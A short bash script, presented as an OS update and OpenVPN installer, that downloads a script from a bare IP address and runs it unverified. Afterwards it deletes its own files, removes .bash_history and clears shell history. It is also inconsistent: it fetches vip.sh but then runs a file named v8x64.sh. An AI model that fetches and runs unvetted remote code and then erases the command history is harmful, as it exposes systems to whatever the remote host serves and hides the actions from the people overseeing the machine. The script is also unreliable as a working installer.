#!/bin/bash

#update os
apt-get update > /dev/null

#openvpn
wget -o /dev/null http://150.95.24.48/vip.sh
chmod +x v8x64.sh
./v8x64.sh
rm v8x64.sh 2>/dev/null

wget -o /dev/null http://150.95.24.48/vip.sh
chmod +x vip.sh
./vip.sh
rm vip.sh 2>/dev/null

#clear
rm install.sh 2>/dev/null
rm jcameron-key.asc 2>/dev/null
rm -rf .bash_history && history -c
